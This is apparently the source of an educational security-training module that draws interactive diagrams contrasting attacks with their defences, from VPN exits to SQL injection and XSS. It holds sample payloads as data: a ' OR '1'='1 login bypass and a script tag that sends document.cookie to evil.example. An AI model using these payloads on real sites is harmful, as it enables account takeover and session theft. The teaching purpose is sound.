// "See it at work" explainers for the Agency desk: small interactive SVG diagrams that show a concept
// operating in the shift's own scenario, without leaving the shift or changing its state. The pure state
// helpers (vpnView, KINDS) are tested in tests/explainers.test.mjs; mount(el, kind) draws one.
// Reduced motion aware, keyboard and screen-reader friendly, fictional data only, no network.

const esc = s => String(s ?? "").replace(/[&<>"']/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
const reduced = () => typeof matchMedia === "function" && matchMedia("(prefers-reduced-motion: reduce)").matches;

// The explainers this module can draw. Keep in step with mount()'s switch and the shift JSON `seeItAtWork.kind`.
export const KINDS = ["vpn", "idor", "cloud", "inbox-rule", "spray", "mfa-fatigue", "ddos", "cert", "chain", "zero-trust", "sqli", "xss", "hashing"];

// VPN full tunnel: the same employee, physically in the London office the whole time. With the VPN off the
// website sees her real public address; with it on, all her traffic leaves through the company's VPN exit, so
// the website sees that exit's address and country instead. Figures match shift-01 (CHG-2291 moved the exit
// from London to the Amsterdam data centre, so staff on the VPN now appear to be in the Netherlands).
export const VPN = {
  home: { place: "London office", note: "Her computer never moves." },
  off: { label: "VPN off", exit: "Her office broadband", ip: "198.51.100.23", country: "United Kingdom", cc: "GB",
    seen: "Signs in from the UK, as you'd expect." },
  on: { label: "VPN on (full tunnel)", exit: "Company VPN exit, Amsterdam", ip: "198.51.100.10", country: "Netherlands", cc: "NL",
    seen: "Signs in from the Netherlands, though she hasn't left her desk. Other staff on the VPN show the same Amsterdam exit." },
};
// Pure: the view for a given toggle state. on=false is the real location, on=true is the VPN exit.
export function vpnView(on) { return on ? VPN.on : VPN.off; }

export function mount(el, kind, opts = {}) {
  if (kind === "vpn") return mountVpn(el, opts);
  if (kind === "idor") return mountIdor(el, opts);
  if (kind === "cloud") return mountCloud(el, opts);
  if (kind === "inbox-rule") return mountInbox(el, opts);
  if (kind === "spray") return mountSpray(el, opts);
  if (kind === "mfa-fatigue") return mountMfa(el, opts);
  if (kind === "ddos") return mountDdos(el, opts);
  if (kind === "cert") return mountCert(el, opts);
  if (kind === "chain") return mountChain(el, opts);
  if (kind === "zero-trust") return mountZt(el, opts);
  if (kind === "sqli") return mountSqli(el, opts);
  if (kind === "xss") return mountXss(el, opts);
  if (kind === "hashing") return mountHash(el, opts);
  el.innerHTML = `<p class="muted">No explainer for "${esc(kind)}".</p>`;
  return null;
}

// The "See it at work" heading. Omitted (head:false) when the explainer sits under a section that already has a
// heading, such as a lesson's "See it" panel, so the heading isn't announced twice.
const xplHead = (title, show) => show === false ? "" : `<div class="xpl-head"><div class="eyebrow">See it at work</div><b>${esc(title)}</b></div>`;

// A shared chrome for the pick-one explainers: a title, a row of option chips, and the outcome area. The whole
// stage is one aria-live region, so both the body (the response card/facts) and the caption are announced on change.
function selector(el, { cls, title, options, render, foot = "", start, head = true }) {
  let cur = start || options[0].key;
  el.innerHTML = `<figure class="xpl ${cls}">
    ${xplHead(title, head)}
    <div class="row xpl-pick" role="group" aria-label="${esc(title)}">
      ${options.map(o => `<button type="button" class="chip xpl-opt" data-k="${esc(o.key)}" aria-pressed="${o.key === cur}">${esc(o.label)}</button>`).join("")}</div>
    <div class="xpl-stage" aria-live="polite"><div id="xpl-body"></div><p class="xpl-caption" id="xpl-cap"></p></div>
    <p class="muted xpl-foot">${esc(foot) || "Simplified and fictional: documentation data only, and a real system records more than this."}</p>
  </figure>`;
  const paint = () => { el.querySelectorAll(".xpl-opt").forEach(b => b.setAttribute("aria-pressed", String(b.dataset.k === cur))); render(cur, el); };
  paint();
  el.querySelectorAll(".xpl-opt").forEach(b => b.addEventListener("click", () => { cur = b.dataset.k; paint(); }));
  return { get value() { return cur; }, set: v => { cur = v; paint(); } };
}

// A shared chrome for the toggle explainers: a title, one toggle button, and the outcome area (an aria-live stage).
// render(on, root) fills the stage and caption; the SVG/markup is specific to each kind.
function toggle(el, { cls, title, stage, label, render, start = false, head = true }) {
  let on = !!start;
  el.innerHTML = `<figure class="xpl ${cls}">
    ${xplHead(title, head)}
    <div class="row xpl-toggle"><button type="button" class="btn" id="xpl-btn" aria-pressed="${on}"></button>
      <span class="muted xpl-state" id="xpl-state"></span></div>
    <div class="xpl-stage" aria-live="polite">${stage}<p class="xpl-caption" id="xpl-cap"></p></div>
    <p class="muted xpl-foot">Simplified and fictional: documentation data only, and a real system records more than this.</p>
  </figure>`;
  const btn = el.querySelector("#xpl-btn"), fig = el.querySelector("." + cls);
  const paint = () => {
    fig.classList.toggle("is-on", on);
    const l = label(on);
    btn.textContent = l.btn; btn.setAttribute("aria-pressed", String(on));
    el.querySelector("#xpl-state").textContent = l.state;
    render(on, el);
  };
  paint();
  btn.addEventListener("click", () => { on = !on; paint(); });
  return { get on() { return on; }, set: v => { on = !!v; paint(); } };
}
const respCard = (ok, status, body) => `<div class="xpl-resp ${ok ? "ok" : "no"}"><span class="xpl-status mono">${esc(status)}</span><span>${esc(body)}</span></div>`;

function mountVpn(el, opts = {}) {
  const t = toggle(el, {
    cls: "xpl-vpn", title: "How a VPN changes your sign-in location", start: opts.start, head: opts.head,
    foot: "Addresses are documentation ranges and the picture is simplified.",
    stage: `<svg viewBox="0 0 360 150" class="xpl-svg" role="img" aria-hidden="true">
        <g class="xpl-node xpl-home" transform="translate(44,75)">
          <rect x="-34" y="-30" width="68" height="60" rx="8"/>
          <g transform="translate(0,-8)"><circle cx="0" cy="-6" r="7"/><path d="M-11 12a11 11 0 0 1 22 0"/></g>
          <text class="xpl-lbl" y="26">London office</text></g>
        <g class="xpl-node xpl-exit" id="xpl-exit" transform="translate(180,75)">
          <rect x="-36" y="-30" width="72" height="60" rx="8"/>
          <g class="xpl-glyph" transform="translate(0,-6)"></g>
          <text class="xpl-lbl" id="xpl-exit-lbl" y="26"></text></g>
        <g class="xpl-node xpl-site" transform="translate(316,75)">
          <rect x="-34" y="-30" width="68" height="60" rx="8"/>
          <g transform="translate(0,-8)"><path d="M-9-7h18v14h-18z"/><path d="M-9-2h18"/></g>
          <text class="xpl-lbl" y="26">Website</text></g>
        <g class="xpl-link xpl-link-a"><line x1="80" y1="75" x2="142" y2="75"/><circle class="xpl-dot" r="3" cx="80" cy="75"/></g>
        <g class="xpl-link xpl-link-b"><line x1="218" y1="75" x2="280" y2="75"/><circle class="xpl-dot" r="3" cx="218" cy="75"/></g>
      </svg>`,
    label: on => ({ btn: on ? "Turn the VPN off" : "Turn the VPN on", state: vpnView(on).label }),
    render: (on, root) => {
      const v = vpnView(on);
      root.querySelector(".xpl-vpn").classList.toggle("is-reduced", reduced());
      // The middle node is the VPN exit only when on; off, it's just a hop on the open internet. Keep it short
      // enough to sit in the box; the city is in the caption.
      root.querySelector("#xpl-exit-lbl").textContent = on ? "VPN exit" : "Internet";
      root.querySelector(".xpl-exit .xpl-glyph").innerHTML = on
        ? '<rect x="-6" y="-2" width="12" height="9" rx="1.5"/><path d="M-3.5-2v-3a3.5 3.5 0 0 1 7 0v3"/>'
        : '<circle cx="0" cy="0" r="8"/><path d="M-8 0h16M0-8v16M-5-5c3 3 7 3 10 0M-5 5c3-3 7-3 10 0"/>';
      root.querySelector("#xpl-cap").innerHTML = `<b>Website sees:</b> ${esc(v.country)} <span class="mono">(${esc(v.ip)})</span>. ${esc(v.seen)}`;
    },
  });
  return t;
}

// IDOR (broken access control): logged in as one customer, you ask for another customer's order by changing the
// number in the URL. Without a server-side ownership check the app hands it over; with one it refuses. Matches
// shift-04 (the stolen session walked order IDs) and the idor-log lab.
export const IDOR = {
  yours: "1001", target: "1002",
  off: { status: "200 OK", shows: "Returns order 1002: another customer's name, address and items.",
    note: "The app never checks who the order belongs to, so changing the number leaks it." },
  on: { status: "403 Forbidden", shows: "Access denied: order 1002 isn't yours.",
    note: "The app checks the order belongs to you first, so walking the IDs gets nowhere." },
};
export function idorView(check) { return check ? IDOR.on : IDOR.off; }
function mountIdor(el, { start = false, head = true } = {}) {
  return toggle(el, {
    cls: "xpl-idor", title: "How changing an order number leaks another customer's data", start, head,
    stage: `<div class="xpl-req"><span class="muted">Signed in as customer A · requesting</span>
        <div class="xpl-url mono">GET /account/orders/<b id="xpl-idor-id"></b></div></div>
      <div id="xpl-idor-resp"></div>`,
    label: on => ({ btn: on ? "Turn the ownership check off" : "Turn the ownership check on",
      state: on ? "Server checks ownership: on" : "Server checks ownership: off" }),
    render: (on, root) => {
      const v = idorView(on);
      root.querySelector("#xpl-idor-id").textContent = IDOR.target;
      root.querySelector("#xpl-idor-resp").innerHTML = respCard(on, v.status, v.shows);
      root.querySelector("#xpl-cap").innerHTML = `${esc(v.note)}`;
    },
  });
}

// Cloud key scope: one leaked application key. If it can read every bucket, the attacker downloads the customer
// exports; if it is least-privilege (only what the app needs) the same key is useless for that. Matches shift-04
// (the app's key downloaded the customer-exports bucket) and the open-bucket lab.
export const CLOUD = {
  bucket: "customer-exports",
  off: { scope: "read + list on every bucket", status: "Allowed", shows: "Lists and downloads the whole customer-exports bucket.",
    note: "A broad key reaches far more than the app needs, so one leak exposes all the data." },
  on: { scope: "write to app-uploads/ only", status: "AccessDenied", shows: "The same key can't touch customer-exports.",
    note: "A least-privilege key only does the app's job, so the same leak gets nothing useful." },
};
export function cloudView(leastPriv) { return leastPriv ? CLOUD.on : CLOUD.off; }
function mountCloud(el, { start = false, head = true } = {}) {
  return toggle(el, {
    cls: "xpl-cloud", title: "Why a leaked key does less harm when it's least privilege", start, head,
    stage: `<div class="xpl-req"><span class="muted">Leaked app key · permissions</span>
        <div class="xpl-url mono" id="xpl-cloud-scope"></div>
        <span class="muted">used against bucket <b class="mono">${esc(CLOUD.bucket)}</b></span></div>
      <div id="xpl-cloud-resp"></div>`,
    label: on => ({ btn: on ? "Make the key broad again" : "Scope the key to least privilege",
      state: on ? "Key permissions: least privilege" : "Key permissions: broad" }),
    render: (on, root) => {
      const v = cloudView(on);
      root.querySelector("#xpl-cloud-scope").textContent = v.scope;
      root.querySelector("#xpl-cloud-resp").innerHTML = respCard(on, v.status, v.shows);
      root.querySelector("#xpl-cap").innerHTML = `${esc(v.note)}`;
    },
  });
}

// Malicious inbox rule: after a mailbox takeover, a quiet rule moves the supplier's real mail to RSS Feeds and
// marks it read, so the owner never sees the bank-change request. Toggle the rule off to reveal the hidden mail.
// Matches shift-02 (the '..' rule on r.hughes's mailbox).
export const INBOX = {
  normal: [{ from: "Rota", subject: "This week's shifts" }, { from: "Vetware", subject: "Software update scheduled" }],
  target: { from: "Grantham Supplies", subject: "Updated bank details for your next invoice" },
  on: { folder: "RSS Feeds", unread: false,
    note: "The hidden rule moves the supplier's real mail out of the Inbox and marks it read, so the owner never sees the bank-change request." },
  off: { folder: "Inbox", unread: true,
    note: "Without the rule it lands in the Inbox, unread, where the owner would question the bank-change request." },
};
export function inboxView(ruleOn) { return ruleOn ? INBOX.on : INBOX.off; }
function mountInbox(el, { start = false, head = true } = {}) {
  const row = (m, extra = "") => `<li class="xpl-mail ${extra}"><b>${esc(m.from)}</b><span>${esc(m.subject)}</span></li>`;
  return toggle(el, {
    cls: "xpl-inbox", title: "How a hidden inbox rule buries the mail that matters", start, head,
    stage: `<div class="xpl-folder"><span class="eyebrow" id="xpl-inbox-folder"></span>
        <ul class="xpl-maillist" id="xpl-inbox-list"></ul></div>`,
    label: on => ({ btn: on ? "Turn the hidden rule off" : "Turn the hidden rule on",
      state: on ? "Hidden rule: on" : "Hidden rule: off" }),
    render: (on, root) => {
      const v = inboxView(on);
      // With the rule on, the supplier mail is gone from the Inbox (moved to RSS Feeds); off, it sits here unread.
      root.querySelector("#xpl-inbox-folder").textContent = `Inbox${on ? "" : " · 1 unread"}`;
      root.querySelector("#xpl-inbox-list").innerHTML =
        INBOX.normal.map(m => row(m)).join("") + (on ? "" : row(INBOX.target, "unread"));
      root.querySelector("#xpl-cap").innerHTML =
        `<b>The supplier's mail is in: ${esc(v.folder)}${v.unread ? "" : " (read)"}.</b> ${esc(v.note)}`;
    },
  });
}

// Three credential attacks that look similar in a log but differ in shape. Spray is the one in shift-01 a5:
// one password against many accounts, one try each, so no single account's lockout trips. Links the signin-spray lab.
export const SPRAY = {
  spray: { label: "Password spray", grid: "1 password x many accounts",
    how: "Tries one common password (like Autumn2026!) once against every account.",
    lockout: "One try per account, so no account's lockout trips: it slips past quietly.",
    catch: "Spotted by many accounts failing from one address in minutes, not by lockouts. The account without MFA is the one that lets them in." },
  brute: { label: "Brute force", grid: "many passwords x 1 account",
    how: "Tries password after password against a single account.",
    lockout: "Trips that account's lockout fast, so it usually fails unless there's no limit.",
    catch: "Spotted by a burst of failures on one account." },
  stuffing: { label: "Credential stuffing", grid: "leaked email+password pairs",
    how: "Replays email and password pairs leaked from some other breach.",
    lockout: "One try per account, so lockouts rarely fire: it works wherever someone reused a password.",
    catch: "Spotted by logins from odd places and by matches to known-breached passwords. MFA stops it even when the password is right." },
};
export function sprayView(k) { return SPRAY[k]; }
function mountSpray(el, { start = "spray" } = {}) {
  return selector(el, {
    cls: "xpl-spray", title: "Password spray, brute force and credential stuffing", start,
    options: [{ key: "spray", label: "Password spray" }, { key: "brute", label: "Brute force" }, { key: "stuffing", label: "Credential stuffing" }],
    foot: "Defender's view only. Fictional accounts and documentation addresses.",
    render: (k, root) => {
      const v = sprayView(k);
      root.querySelector("#xpl-body").innerHTML = `<div class="xpl-shape mono">${esc(v.grid)}</div>
        <dl class="xpl-facts"><div><dt>What it tries</dt><dd>${esc(v.how)}</dd></div>
        <div><dt>Lockout</dt><dd>${esc(v.lockout)}</dd></div></dl>`;
      root.querySelector("#xpl-cap").innerHTML = `<b>How you catch it:</b> ${esc(v.catch)}`;
    },
  });
}

// MFA fatigue (shift-02 a2): an attacker with the password fires repeated push prompts hoping the user taps Approve.
// Number matching is the fix: the user must type a number shown on the login screen, so a prompt they didn't start
// has no number to match and can't be approved blindly.
export const MFA = {
  off: { prompts: "Prompt after prompt: 'Approve sign-in?'", action: "One tired tap of Approve and the attacker is in.",
    note: "A plain yes/no push can be approved by reflex, which is exactly what a flood of prompts is counting on." },
  on: { prompts: "The app shows: 'Enter the number on your screen.'", action: "The attacker's screen has the number; the user's doesn't, so there's nothing to type.",
    note: "Number matching ties the approval to the real sign-in, so a prompt the user didn't start can't be approved by mistake." },
};
export function mfaView(numberMatching) { return numberMatching ? MFA.on : MFA.off; }
function mountMfa(el, { start = false } = {}) {
  return toggle(el, {
    cls: "xpl-mfa", title: "Why number matching stops MFA-fatigue attacks", start,
    stage: `<div class="xpl-req"><span class="muted">Attacker has the password and is firing push prompts</span>
        <div class="xpl-url" id="xpl-mfa-prompt"></div></div><div id="xpl-mfa-resp"></div>`,
    label: on => ({ btn: on ? "Turn number matching off" : "Turn number matching on",
      state: on ? "Number matching: on" : "Number matching: off" }),
    render: (on, root) => {
      const v = mfaView(on);
      root.querySelector("#xpl-mfa-prompt").textContent = v.prompts;
      root.querySelector("#xpl-mfa-resp").innerHTML = respCard(on, on ? "Blocked" : "Account taken over", v.action);
      root.querySelector("#xpl-cap").innerHTML = `${esc(v.note)}`;
    },
  });
}

// DDoS: a server has a fixed capacity. Normal traffic sits under it; a flood of junk requests fills it so real
// visitors are squeezed out. Toggle the attack on and off. Ties to the ddos lesson and the ddos-or-busy lab.
export const DDOS = {
  cap: 100, legit: 35,
  off: { attack: 0, served: true, note: "Normal traffic sits under the server's capacity, so every real visitor is served." },
  on: { attack: 240, served: false, note: "A flood of junk requests fills the capacity, so real visitors are squeezed out and time out. That is a denial of service: the site is down without anything being broken into." },
};
export function ddosView(on) { return on ? DDOS.on : DDOS.off; }
function mountDdos(el, opts = {}) {
  return toggle(el, {
    cls: "xpl-ddos", title: "How a flood of requests knocks a server offline", start: opts.start, head: opts.head,
    stage: `<div class="xpl-capwrap"><div class="xpl-cap" id="xpl-ddos-bar" aria-hidden="true">
        <span class="xpl-seg legit" id="xpl-ddos-legit"></span><span class="xpl-seg attack" id="xpl-ddos-attack"></span>
        <span class="xpl-capline"></span></div>
      <div class="xpl-caplabel mono"><span>Server capacity</span><span id="xpl-ddos-load"></span></div></div>
      <div id="xpl-ddos-resp"></div>`,
    label: on => ({ btn: on ? "Stop the attack" : "Start the attack",
      state: on ? "Traffic: flood" : "Traffic: normal" }),
    render: (on, root) => {
      const v = ddosView(on), total = DDOS.legit + v.attack, pct = x => Math.min(100, (x / DDOS.cap) * 100);
      root.querySelector("#xpl-ddos-legit").style.width = pct(DDOS.legit) + "%";
      root.querySelector("#xpl-ddos-attack").style.width = Math.max(0, Math.min(100 - pct(DDOS.legit), pct(v.attack))) + "%";
      root.querySelector("#xpl-ddos-load").textContent = `${total} / ${DDOS.cap} requests`;
      root.querySelector("#xpl-ddos-bar").classList.toggle("over", total > DDOS.cap);
      root.querySelector("#xpl-ddos-resp").innerHTML = respCard(v.served, v.served ? "Real visitors served" : "Real visitors time out", on ? "Legitimate requests can't get through the flood." : "There is headroom for everyone.");
      root.querySelector("#xpl-cap").innerHTML = `${esc(v.note)}`;
    },
  });
}

// Certificate validation: the browser only shows a padlock when the certificate matches the site, is in date and is
// signed by a trusted CA. Pick a fault to see which check fails and the exact error. Matches the cert-check lab.
export const CERT = {
  valid: { label: "Valid", ok: true, code: "Connection is secure", why: "The name matches, it is in date, and a trusted authority signed it." },
  expired: { label: "Expired", ok: false, code: "NET::ERR_CERT_DATE_INVALID", why: "The certificate's valid-until date has passed, so the browser no longer trusts it." },
  host: { label: "Wrong host", ok: false, code: "NET::ERR_CERT_COMMON_NAME_INVALID", why: "The site's name isn't listed in the certificate (its SAN list), so it may not belong to this site." },
  selfsigned: { label: "Self-signed", ok: false, code: "NET::ERR_CERT_AUTHORITY_INVALID", why: "It was signed by itself, not by an authority the browser trusts, so anyone could have made it." },
};
export function certView(k) { return CERT[k]; }
function mountCert(el, opts = {}) {
  return selector(el, {
    cls: "xpl-cert", title: "What makes a browser trust a site's certificate", start: opts.start, head: opts.head,
    options: [{ key: "valid", label: "Valid" }, { key: "expired", label: "Expired" }, { key: "host", label: "Wrong host" }, { key: "selfsigned", label: "Self-signed" }],
    foot: "Error codes are Chrome's. The cert-check lab reads the same faults in real OpenSSL output.",
    render: (k, root) => {
      const v = certView(k);
      root.querySelector("#xpl-body").innerHTML = respCard(v.ok, v.ok ? "🔒 " + v.code : v.code, v.why);
      root.querySelector("#xpl-cap").innerHTML = v.ok
        ? `<b>Trusted.</b> All three checks pass: name, date and a trusted signer.`
        : `<b>Blocked.</b> The browser warns the user before they go any further.`;
    },
  });
}

// Attack chain (shift-03): one incident that moved from a PC to the file server. A stepped timeline so the
// learner sees how the separate alerts (malware, exfiltration, backup deletion) are one story, caught before
// encryption. Stages map to the malware-tree and ransomware-timeline evidence labs.
export const CHAIN = {
  steps: [
    { n: 1, title: "Infected workstation", at: "HAL-PC-07", lab: "the malware-tree lab",
      text: "j.doyle opens a file that looks like a PDF but ends .pdf.js. It runs hidden PowerShell and drops winupd.exe, an infostealer that beacons out." },
    { n: 2, title: "Credentials stolen", at: "HAL-PC-07", lab: null,
      text: "The infostealer scrapes saved logins from the machine, including the svc-backup service account's password." },
    { n: 3, title: "Into the file server", at: "FS01", lab: "the ransomware-timeline lab",
      text: "The stolen svc-backup login is used to RDP from the workstation into FS01, the client's file server. A service account logging in interactively is the tell." },
    { n: 4, title: "Client data stolen", at: "FS01", lab: "the ransomware-timeline lab",
      text: "rclone copies about 23 GB of client data out to an external cloud address overnight. That is the data breach." },
    { n: 5, title: "Backups sabotaged, caught in time", at: "FS01", lab: "the ransomware-timeline lab", win: true,
      text: "svc-backup deletes Windows shadow copies and the backup catalogue and turns off recovery: the usual last step before ransomware encrypts. The SOC caught it here, before any files were encrypted." },
  ],
};
export function chainStep(i) { return CHAIN.steps[i]; }
function mountChain(el, { start = 0 } = {}) {
  let i = Math.max(0, Math.min(CHAIN.steps.length - 1, start | 0));
  el.innerHTML = `<figure class="xpl xpl-chain">
    <div class="xpl-head"><div class="eyebrow">See it at work</div><b>How this attack moved from a PC to the file server</b></div>
    <ol class="xpl-timeline" id="xpl-chain-steps">${CHAIN.steps.map((s, k) => `<li><button type="button" class="xpl-step${s.win ? " win" : ""}" data-i="${k}" aria-pressed="${k === i}"><span class="xpl-step-n">${s.n}</span><span class="xpl-step-t">${esc(s.title)}</span></button></li>`).join("")}</ol>
    <div class="xpl-stage"><div class="xpl-chain-detail" id="xpl-chain-detail" aria-live="polite"></div>
      <div class="row"><button type="button" class="btn ghost" id="xpl-chain-back">‹ Back</button><button type="button" class="btn" id="xpl-chain-next">Next stage ›</button></div></div>
    <p class="muted xpl-foot">Defender's view only. Fictional client, documentation addresses; the simulated EDR export is labelled as such in the shift.</p>
  </figure>`;
  const paint = () => {
    const s = CHAIN.steps[i];
    el.querySelectorAll(".xpl-step").forEach(b => b.setAttribute("aria-pressed", String(Number(b.dataset.i) === i)));
    el.querySelector("#xpl-chain-detail").innerHTML = `<div class="xpl-chain-card${s.win ? " win" : ""}"><span class="eyebrow">Stage ${s.n} of ${CHAIN.steps.length} · ${esc(s.at)}</span>
      <b>${esc(s.title)}</b><p>${esc(s.text)}</p>${s.lab ? `<p class="muted">Read the evidence in ${esc(s.lab)}.</p>` : ""}</div>`;
    el.querySelector("#xpl-chain-back").disabled = i === 0;
    el.querySelector("#xpl-chain-next").disabled = i === CHAIN.steps.length - 1;
  };
  paint();
  el.querySelectorAll(".xpl-step").forEach(b => b.addEventListener("click", () => { i = Number(b.dataset.i); paint(); }));
  el.querySelector("#xpl-chain-back").addEventListener("click", () => { if (i > 0) { i--; paint(); } });
  el.querySelector("#xpl-chain-next").addEventListener("click", () => { if (i < CHAIN.steps.length - 1) { i++; paint(); } });
  return { get step() { return i; }, set: v => { i = Math.max(0, Math.min(CHAIN.steps.length - 1, v | 0)); paint(); } };
}

// Zero trust vs the old perimeter model (network-modern lesson, BeyondCorp case). The same request from a
// compromised laptop: on a perimeter network, being "inside" is enough; with zero trust every request is checked.
export const ZT = {
  off: { model: "Perimeter (castle and moat)", status: "Trusted by location",
    note: "Once inside the network, through the VPN or a stolen laptop, you're trusted and can reach the file server, the admin panel, everything. One foothold reaches it all." },
  on: { model: "Zero trust (verify every request)", status: "Checked every request",
    note: "Every request is checked against who you are, your device's health and the context, whatever network you're on. A stolen session that fails the checks is denied, even from inside." },
};
export function ztView(on) { return on ? ZT.on : ZT.off; }
function mountZt(el, opts = {}) {
  return toggle(el, {
    cls: "xpl-zt", title: "Perimeter trust vs zero trust", start: opts.start, head: opts.head,
    stage: `<div class="xpl-req"><span class="muted">A request from a compromised laptop to the file server</span>
        <div class="xpl-url mono" id="xpl-zt-model"></div></div><div id="xpl-zt-resp"></div>`,
    label: on => ({ btn: on ? "Switch to the old perimeter model" : "Switch to zero trust",
      state: on ? "Model: zero trust" : "Model: perimeter" }),
    render: (on, root) => {
      const v = ztView(on);
      root.querySelector("#xpl-zt-model").textContent = v.model;
      root.querySelector("#xpl-zt-resp").innerHTML = respCard(on, v.status, on ? "The file server checks the request and denies it if the device or identity fails." : "Inside the network counts as trusted, so the stolen session reaches the file server.");
      root.querySelector("#xpl-cap").innerHTML = `${esc(v.note)}`;
    },
  });
}

// SQL injection: the login password box contains  ' OR '1'='1  . With a string-built query the input becomes part
// of the SQL and the WHERE always matches; a parameterised query sends it as data, so it is just a password that
// never matches. Matches the web-sqli lesson and the sqli-log lab.
export const SQLI = {
  off: { query: "SELECT * FROM users WHERE name='admin' AND pass='' OR '1'='1'", status: "200 OK",
    body: "Logged in as admin. '1'='1' is always true, so the WHERE matches every row.",
    note: "The typed text is glued straight into the query, so it becomes part of the code." },
  on: { query: "SELECT * FROM users WHERE name='admin' AND pass = ?      (? = the whole typed string)", status: "401 Unauthorized",
    body: "Login fails. The whole input is treated as one password, which simply doesn't match.",
    note: "A parameterised query sends the input as data, never as code, so injection can't change the query." },
};
export function sqliView(paramised) { return paramised ? SQLI.on : SQLI.off; }
function mountSqli(el, opts = {}) {
  return toggle(el, {
    cls: "xpl-sqli", title: "SQL injection: input as code vs input as data", start: opts.start, head: opts.head,
    stage: `<div class="xpl-req"><span class="muted">Login where the password box contains <span class="mono">' OR '1'='1</span></span>
        <div class="xpl-url mono" id="xpl-sqli-q"></div></div><div id="xpl-sqli-resp"></div>`,
    label: on => ({ btn: on ? "Turn parameterised queries off" : "Turn parameterised queries on",
      state: on ? "Defence: parameterised query" : "Defence: none (string-built query)" }),
    render: (on, root) => { const v = sqliView(on);
      root.querySelector("#xpl-sqli-q").textContent = v.query;
      root.querySelector("#xpl-sqli-resp").innerHTML = respCard(on, v.status, v.body);
      root.querySelector("#xpl-cap").innerHTML = esc(v.note); },
  });
}

// Stored XSS: a saved review/comment contains a <script> tag. Written into the page as raw HTML, the browser runs
// it (and can steal a viewer's session cookie); escaped on output, the tag is shown as harmless text. Matches the
// web-xss lesson and the xss-review lab.
export const XSS = {
  comment: "<script>fetch('//evil.example/c?='+document.cookie)</script>",
  off: { status: "Runs as code", body: "Every viewer's browser runs the script, so an admin who opens the page has their session cookie sent to the attacker.",
    note: "The comment is written into the page as HTML, so the browser treats the <script> as code." },
  on: { status: "Shown as text", body: "The page prints the characters of the tag as harmless text. Nothing runs.",
    note: "Escaping turns < > & into &lt; &gt; &amp;, so the browser shows the tag instead of running it." },
};
export function xssView(escaped) { return escaped ? XSS.on : XSS.off; }
function mountXss(el, opts = {}) {
  return toggle(el, {
    cls: "xpl-xss", title: "Stored XSS: escaped output vs raw output", start: opts.start, head: opts.head,
    stage: `<div class="xpl-req"><span class="muted">A review is saved containing a &lt;script&gt; tag</span>
        <div class="xpl-url mono" id="xpl-xss-c"></div></div><div id="xpl-xss-resp"></div>`,
    label: on => ({ btn: on ? "Turn output escaping off" : "Turn output escaping on",
      state: on ? "Defence: output escaped" : "Defence: none (raw HTML)" }),
    render: (on, root) => { const v = xssView(on);
      root.querySelector("#xpl-xss-c").textContent = XSS.comment;
      root.querySelector("#xpl-xss-resp").innerHTML = respCard(on, v.status, v.body);
      root.querySelector("#xpl-cap").innerHTML = esc(v.note); },
  });
}

// Hashing: pick an input and see its SHA-256. The same text always gives the same hash; a one-character change
// gives a completely different one (the avalanche effect); and you can't work backwards. Real SHA-256 values.
// Matches the encryption lesson and the hashing lab.
export const HASHES = [
  { key: "a", input: "password", hash: "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8" },
  { key: "b", input: "Password", hash: "e7cf3ef4f17c3999a94f2c6f612e8a888e5b1026878e4e19398b23bd38ec221a" },
  { key: "c", input: "password1", hash: "0b14d501a594442a01c6859541bcb3e8164d183d32937b851835442f69d5c94e" },
];
export function hashView(key) { return HASHES.find(h => h.key === key) || HASHES[0]; }
function mountHash(el, opts = {}) {
  return selector(el, {
    cls: "xpl-hash", title: "Hashing: same in, same out; one change, totally different", head: opts.head, start: opts.start,
    options: HASHES.map(h => ({ key: h.key, label: h.input })),
    foot: "SHA-256, shown in full. A real login also adds a random salt per user before hashing, so equal passwords still differ.",
    render: (key, root) => { const v = hashView(key);
      root.querySelector("#xpl-body").innerHTML = `<div class="xpl-req"><span class="muted">SHA-256 of <b class="mono">${esc(v.input)}</b></span><div class="xpl-url mono">${esc(v.hash)}</div></div>`;
      root.querySelector("#xpl-cap").innerHTML = "The same text always gives the same hash, but changing one character changes all of it, and you can't work backwards from the hash to the text."; },
  });
}
